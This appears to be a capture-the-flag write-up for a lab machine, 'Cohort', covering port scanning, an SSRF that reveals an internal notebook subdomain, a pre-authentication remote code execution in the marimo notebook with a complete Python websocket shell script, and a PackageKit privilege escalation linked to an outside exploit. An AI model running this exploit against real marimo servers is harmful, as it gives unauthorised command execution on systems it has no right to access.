# COHORT

## RECON

```
nmap -sV cohort.htb
```

```
Nmap scan report for cohort.htb (10.129.6.107)
Host is up (0.64s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### port 443 / port 80

<img width="1398" height="809" alt="Screenshot 2026-08-09 at 02 02 14" src="https://github.com/user-attachments/assets/534f0969-68a4-474b-a7b1-92d2415a95fe" />

directory enumeration(dirsearch)

```
dirsearch - u "https://cohort.htb"
```

```
404   564B   https://cohort.htb/favicon.ico
403   564B   https://cohort.htb/status
403   564B   https://cohort.htb/status?full=true
```
403 - server rejected our request for the endpoint `status`.(but it exists)

 this page claims that it fetches the data that the user mentioned. like if i mention any csv file, for example, here  i turned on a http server and tried to fetch ``backdoor.csv`` file. it reads that file.
 
<img width="529" height="509" alt="Screenshot 2026-08-09 at 02 09 09" src="https://github.com/user-attachments/assets/7e1a1738-741c-4ed0-ba71-15ec881fd550" />

### SSRF - Server Side Request Forgery

here it is not actually validating the file that we request for example we gave the format as csv but tried to call rit.txt and it actually fetched it which is no intented.

<img width="556" height="510" alt="Screenshot 2026-08-09 at 02 15 05" src="https://github.com/user-attachments/assets/0a7ecb03-e273-49f5-8ec7-bb2ac33a9c68" />

SSRF - making the server side application to request for an unintended location for example here if we are able to request files in the localhost which is not intended then this application is vulnerable to SSRF.

```
request to localhost - https://127.1/

response :
Reachable. HTTP 200 (text/html)

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Cohort Analytics</title>
<meta name="description" content="Cohort Analytics - retention intelligence for subscription teams.">
<link rel="stylesheet" href="/assets/styles.css">
</head>
<body>
<div id="app" data-page="home" aria-busy="true">
  <div class="boot"><span class="boot-mark" aria-hidden="true"></span><span>Loading Cohort Analytics</span></div>
</div>
<noscript>
  <div style="max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;">
    <h1 style="font-size:1.4rem;">JavaScript required</h1>
    <p style="color:#4a5159;">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>
  </div>
</noscript>
<script src="/assets/app.js" defer></script>
</body>
</html>
```

through this we can confirm that it is vulnerble to SSRF.

``` /status``` endpoint was there but the server rejected our request.

```
request - https://127.1/status

response :
Reachable. HTTP 200 (application/json)

{"service":"cohort-edge",
"status":"ok","generated_by":"nginx",
"upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},
{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
```

```exposes a sub domain - nb-1be3782a8afd3ad5.cohort.htb```

that subdomain leads to marimo authentication page.

marimo login page - CVE-2026–39987 ```https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc```

CVE-2026-39987 is a critical pre-authentication remote code execution vulnerability in marimo, an open-source reactive Python notebook. 

```
script::

import websocket
import ssl
import threading
import sys
import time

TARGET = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

print("[*] Connecting...")
# Use create_connection for a simple socket
ws = websocket.create_connection(TARGET, sslopt={"cert_reqs": ssl.CERT_NONE})
print("[+] Connected! Authentication bypassed.")
print("[*] Starting interactive stream... (Type commands below)\n")

# 1. READER THREAD: Constantly listens for output from the server
def reader():
    while True:
        try:
            data = ws.recv()
            if data:
                # Write directly to stdout without adding newlines
                sys.stdout.write(data)
                sys.stdout.flush()
        except Exception as e:
            print(f"\n[!] Connection error: {e}")
            break

# Start the reader in the background
t = threading.Thread(target=reader, daemon=True)
t.start()

# 2. WRITER LOOP: Reads your keyboard input and sends it
try:
    while True:
        # Read from standard input
        cmd = sys.stdin.readline()
        if not cmd:
            break
        # Send the command (readline includes the newline character)
        ws.send(cmd)
except KeyboardInterrupt:
    print("\n[*] Exiting...")
    ws.close()
```

using this we will get the ```marimo``` user's reverse shell.

got the user flag. - ```user.txt```

## PRIVILEGE ESCALATION

Packagekit - v 1.2.8 vulnerable to Pack2TheRoot.

packagekit - it is like a middlemen between gui software managers and underlying system managers. 
for example, we use ```apt``` to install applications. if we use any gui application(not exactly playstore but kind off)(gnome store) this packagekit translates from the gui to system managers like apt.


### Pack2TheRoot - CVE-2026–41651

local privilege escalation vulnerability in packagekit with TOCTOU race condition vulnerability.

what is ```TOCTOU``` ?

TOCTOU (Time-of-Check to Time-of-Use) is a race condition where a program:

Checks whether something is valid.
Waits before using it.
During that waiting period, another process changes the data.
The program then uses the modified data.

here in this case for the thread 1 the user gets authentication without any password or creds and we use that same authentication for getting the root shell.

https://github.com/0xBlackash/CVE-2026-41651

### Root flag:

got root shell and root flag.




